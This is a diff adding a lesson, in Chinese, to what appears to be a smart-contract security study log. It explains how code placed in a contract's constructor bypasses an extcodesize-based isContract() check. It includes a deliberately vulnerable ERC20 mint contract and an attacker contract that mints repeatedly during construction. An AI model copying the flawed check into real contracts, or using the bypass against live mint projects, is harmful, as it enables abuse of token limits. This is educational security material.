@@ -2954,8 +2954,53 @@ import '@openzeppelin/contracts/access/Ownable.sol';
     ```
     - 预防方法：使用预言机项目提供的链下随机数来预防这类漏洞，例如 Chainlink VRF。
 - [104-S08] 绕过合约检查
+    - 很多 freemint 的项目为了限制科学家（程序员）会用到 isContract() 方法，希望将调用者 msg.sender 限制为外部账户（EOA），而非合约。这个函数利用 extcodesize 获取该地址所存储的 bytecode 长度（runtime），若大于0，则判断为合约，否则就是EOA（用户）。
+    - 在合约在被创建的时候，runtime bytecode 还没有被存储到地址上，因此 bytecode 长度为0。也就是说，如果我们将逻辑写在合约的构造函数 constructor 中的话，就可以绕过 isContract() 检查。
+    - 漏洞例子：
+    ```solidity
+    contract ContractCheck is ERC20 {
+        constructor() ERC20("", "") {}        
+        function isContract(address account) public view returns (bool) {
+            // extcodesize > 0 的地址一定是合约地址, 但是合约在构造函数时候 extcodesize 为0
+            uint size;
+            assembly {
+                size := extcodesize(account)
+            }
+            return size > 0;
+        }
+
+        function mint() public {
+            require(!isContract(msg.sender), "Contract not allowed!"); // mint函数，只有非合约地址能调用（有漏洞）
+            _mint(msg.sender, 100);
+        }
+    }
+
+    // 利用构造函数的特点攻击
+    contract NotContract {
+        bool public isContract;
+        address public contractCheck;
+
+        // 当合约正在被创建时，extcodesize (代码长度) 为 0，因此不会被 isContract() 检测出。
+        constructor(address addr) {
+            contractCheck = addr;
+            isContract = ContractCheck(addr).isContract(address(this));
+            // This will work
+            for(uint i; i < 10; i++){
+                ContractCheck(addr).mint();
+            }
+        }
+
+        // 合约创建好以后，extcodesize > 0，isContract() 可以检测
+        function mint() external {
+            ContractCheck(contractCheck).mint();
+        }
+    }
+    ```
+    - 解决办法：使用 (tx.origin == msg.sender) 来检测调用者是否为合约。如果调用者为 EOA，那么tx.origin和msg.sender相等；如果它们俩不相等，调用者为合约。
 - [104-S09] 拒绝服务
 
+
+<!-- Content_END -->
 ### 2024.10.15
 
 - [104-S10] 貔貅
@@ -2970,4 +3015,3 @@ import '@openzeppelin/contracts/access/Ownable.sol';
 - [104-S16] NFT重入攻击
 - [104-S17] “跨服”重入攻击
 
-<!-- Content_END -->
